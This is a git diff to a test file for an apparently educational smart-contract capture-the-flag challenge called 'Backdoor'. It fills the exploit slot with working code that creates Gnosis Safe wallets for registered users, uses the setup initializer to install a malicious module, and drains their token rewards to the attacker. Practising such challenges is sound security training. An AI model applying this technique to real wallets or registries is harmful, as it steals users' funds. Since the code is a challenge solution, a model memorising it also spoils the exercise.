@@ -36,7 +36,38 @@ describe('[Challenge] Backdoor', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // we can create a gnosis safe wallet with the user as the onwer and
+        // register a module in the wallet to steal the funds
+        const hackModule = await (await ethers.getContractFactory('HackModule', attacker)).deploy();
+        const setupData = hackModule.interface.encodeFunctionData("setup", [hackModule.address]);
+
+        for(let i = 0; i < users.length; i++) {
+            const user = users[i];
+
+            const initializer = this.masterCopy.interface.encodeFunctionData("setup", [
+                [user], // owners
+                1, // _threshold
+                hackModule.address, // to
+                setupData, // data
+                ethers.constants.AddressZero, // fallbackHandler
+                ethers.constants.AddressZero, // paymentToken
+                0, // payment
+                ethers.constants.AddressZero, // paymentReceiver
+              ])
+
+            const tx = await this.walletFactory.connect(attacker).createProxyWithCallback(
+                this.masterCopy.address,
+                initializer,
+                0,
+                this.walletRegistry.address,
+            )
+            const txData = await tx.wait();
+
+            const proxyCreationEvent = txData.events.find(x => x.event == 'ProxyCreation');
+            const proxyAddress = proxyCreationEvent.args.proxy;
+
+            await hackModule.hack(proxyAddress, this.token.address, attacker.address);
+        }
     });
 
     after(async function () {
